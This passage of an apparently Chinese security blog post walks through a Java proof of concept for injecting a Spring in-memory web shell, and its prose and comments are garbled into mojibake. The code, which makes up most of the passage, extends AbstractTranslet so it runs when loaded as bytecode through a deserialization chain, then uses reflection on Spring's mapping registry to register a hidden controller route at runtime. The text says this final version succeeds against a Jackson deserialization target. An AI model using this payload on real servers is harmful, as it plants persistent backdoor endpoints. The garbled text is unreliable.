</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">   </span><span class="c1">//è·å–RequestMappingHandlerMappingå¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TestController</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;ttee&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getMappingForMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;getMappingForMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">getMappingForMethod</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingInfo</span><span class="w"> </span><span class="n">invoke</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RequestMappingInfo</span><span class="p">)</span><span class="w"> </span><span class="n">getMappingForMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">,</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="p">,</span><span class="w"> </span><span class="n">TestController</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.util.ReflectionUtils&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getDeclaredFields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass1</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;findField&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">getDeclaredFields</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">Fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Field</span><span class="p">)</span><span class="w"> </span><span class="n">getDeclaredFields</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">aClass1</span><span class="p">,</span><span class="w"> </span><span class="n">bean</span><span class="p">.</span><span class="na">getClass</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;mappingRegistry&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Fields</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//è¿™é‡Œæ˜¯è·å–RequestMappingHandlerMappingçš„mappingRegistryï¼Œå¯¹åº”çš„æ˜¯AbstractHandlerMethodMapping$MappingRegistry</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">abstractHandlerMethodMapping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Fields</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">bean</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">register</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass2</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;register&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">register</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">unregister</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass2</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;unregister&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unregister</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unregister</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">abstractHandlerMethodMapping</span><span class="p">,</span><span class="n">invoke</span><span class="p">);</span><span class="w"> </span><span class="c1">//è¿™é‡Œæ˜¯å› ä¸ºæ˜¯æœ¬åœ°è°ƒç”¨è¦unregister()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">register</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">abstractHandlerMethodMapping</span><span class="p">,</span><span class="w"> </span><span class="n">invoke</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TestController</span><span class="p">(),</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">invoke</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;1111111111111111111111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Inject done&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="o">[]</span><span class="w"> </span><span class="n">handlers</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">DTMAxisIterator</span><span class="w"> </span><span class="n">iterator</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestController</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&#34;/ttee&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">ttee</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ttee&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;tteeeeeee&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ä½†æ˜¯ä¸Šé¢è¿™ä¸ªpocä¸å¥½ï¼Œä»–è¿˜æœ‰ä¸€ä¸ªè°ƒç”¨å­ç±»ï¼ˆ<code>TestController</code>ï¼‰çš„æ“ä½œï¼Œç”¨<code>åŠ è½½å­—èŠ‚ç </code>è°ƒç”¨çš„è¯ä¼šæŠ¥é”™ï¼š<code>æ‰¾ä¸åˆ°ç±»</code>è¿™ä¸ªé”™è¯¯</p>
<p>è¿˜æœ‰ä¸Šé¢è¿™ä¸ª<code>unregister</code>æ˜¯å› ä¸ºæ˜¯æœ¬åœ°ç¯å¢ƒæ‰€ä»¥ç”¨è¿™ä¸ªï¼Œè§£å†³<code>å‘ç‚¹2</code>ï¼Œä¸æ˜¯æœ¬åœ°è¯ï¼Œå¦‚æœæœ¬èº«æ²¡è¿™ä¸ªmappingï¼Œç›´æ¥è°ƒç”¨unregisterä¼šè¿”å›<code>return;</code></p>
<h3 id="æœ€ç»ˆpocå­—èŠ‚ç å½¢å¼">æœ€ç»ˆpoc(å­—èŠ‚ç å½¢å¼<a hidden class="anchor" aria-hidden="true" href="#æœ€ç»ˆpocå­—èŠ‚ç å½¢å¼">#</a></h3>
<p>æˆ‘ä»¬æŠŠè¦<code>è®¿é—®çš„æ–¹æ³•</code>å†™åˆ°ä¸€ä¸ªClassé‡Œï¼Œæœ¬èº«è¿™ä¸ªClassï¼ˆ<code>Exec</code>ï¼‰æ˜¯èƒ½æ‰¾åˆ°çš„ï¼Œ<code>TestController</code>ä¼šæ‰¾ä¸åˆ°</p>
<p>å†å†™ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œé¿å…å®ä¾‹åŒ–çš„æ—¶å€™ä¸€ç›´<code>å¾ªç¯è°ƒç”¨æ— å‚æ„é€ æ–¹æ³•</code></p>
<p>è¿™é‡Œè·å–<code>RequestMappingInfo</code>æˆ‘è¿˜æ˜¯ç”¨çš„<code>springçš„æ–¹æ³•</code>ï¼Œæœ¬åœ°æ‰“çš„è¯è¦æ³¨æ„ä¸‹ï¼ˆå‘ç‚¹2ï¼‰ï¼Œæˆ‘è¿™é‡Œæ˜¯ç”¨æ¥æ‰“<code>jacksonåŸç”Ÿé“¾+springå†…å­˜é©¬</code>çš„ï¼Œæ˜¯åŠ è½½çš„ä¸‹é¢<code>ç±»çš„å­—èŠ‚ç </code>ï¼Œæ˜¯å¯ä»¥æ‰“æˆåŠŸçš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">payload</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.RequestMappingInfo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Exec</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&#34;/ttee&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">ttee</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ttee&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;tteeeeeee&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Exec</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;main&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">context</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Exec</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;ttee&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getMappingForMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;getMappingForMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">getMappingForMethod</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingInfo</span><span class="w"> </span><span class="n">invoke</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RequestMappingInfo</span><span class="p">)</span><span class="w"> </span><span class="n">getMappingForMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">,</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="p">,</span><span class="w"> </span><span class="n">Exec</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.util.ReflectionUtils&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getDeclaredFields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass1</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;findField&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">getDeclaredFields</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">Fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Field</span><span class="p">)</span><span class="w"> </span><span class="n">getDeclaredFields</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">aClass1</span><span class="p">,</span><span class="w"> </span><span class="n">bean</span><span class="p">.</span><span class="na">getClass</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;mappingRegistry&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Fields</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">abstractHandlerMethodMapping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Fields</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">bean</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">register</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass2</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;register&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">register</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;register------------------&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">register</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">abstractHandlerMethodMapping</span><span class="p">,</span><span class="w"> </span><span class="n">invoke</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Exec</span><span class="p">(</span><span class="s">&#34;a&#34;</span><span class="p">),</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">invoke</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;1111111111111111111111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Exec</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="o">[]</span><span class="w"> </span><span class="n">handlers</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">DTMAxisIterator</span><span class="w"> </span><span class="n">iterator</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="0x04-æ€»ç»“">0x04 æ€»ç»“<a hidden class="anchor" aria-hidden="true" href="#0x04-æ€»ç»“">#</a></h2>
<p>èµ·åˆæ˜¯æƒ³è‡ªå·±å‘ç°å’Œæ„é€ çš„ï¼Œä½†æ˜¯èŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œåé¢ä¹Ÿæ˜¯æ²¡è€å¿ƒäº†å»çœ‹äº†ç½‘ä¸Šæ–‡ç« ï¼Œä¸»è¦æ‰¾ä¸Šä¸‹æ–‡é‚£ä¸ªåœ°æ–¹æ„Ÿè§‰æ€è·¯ä¸å¯¹ï¼ˆç›®å‰è¿˜æ²¡å•¥æƒ³æ³•ï¼‰ï¼Œè€Œä¸”æ”¶æ•ˆç”šå¾®ã€‚</p>
